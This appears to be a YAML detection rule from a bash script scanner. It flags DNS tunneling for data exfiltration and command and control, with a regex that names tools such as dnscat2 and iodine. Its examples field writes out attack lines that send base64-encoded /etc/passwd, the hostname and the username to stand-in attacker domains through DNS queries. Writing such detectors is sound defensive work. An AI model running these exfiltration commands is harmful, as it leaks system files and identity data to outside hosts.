# Bash Pattern: DNS Tunneling
# Detects DNS tunneling for data exfiltration or C2

id: BASH-016
name: DNS Tunneling Detection
description: |
  Detects DNS tunneling techniques used for data exfiltration or command and
  control communication. Attackers use DNS queries to bypass network restrictions
  and exfiltrate data. This pattern identifies suspicious DNS query patterns,
  tools like dnscat2 and iodine, and encoded data in DNS queries.
languages:
  - bash
detection_type: regex
detection_logic: '(?:dnscat2|iodine|dns2tcp|nslookup.*-type=txt|dig.*txt.*@|host.*-t\s*txt|while.*nslookup.*sleep)'
severity: Medium
mitre_technique: T1071.004
confidence: 0.8
category: command_and_control
enabled: true
metadata:
  author: Script Sentinel Team
  created: "2025-11-17"
  updated: "2025-11-17"
  references:
    - "https://attack.mitre.org/techniques/T1071/004/"
    - "https://github.com/iagox86/dnscat2"
  tags:
    - bash
    - dns-tunneling
    - exfiltration
    - c2
  examples:
    - "dnscat2 --dns server=attacker.com"
    - "while true; do nslookup $(cat /etc/passwd | base64).evil.com; sleep 60; done"
    - "dig txt $(hostname).$(whoami).attacker.com @ns.attacker.com"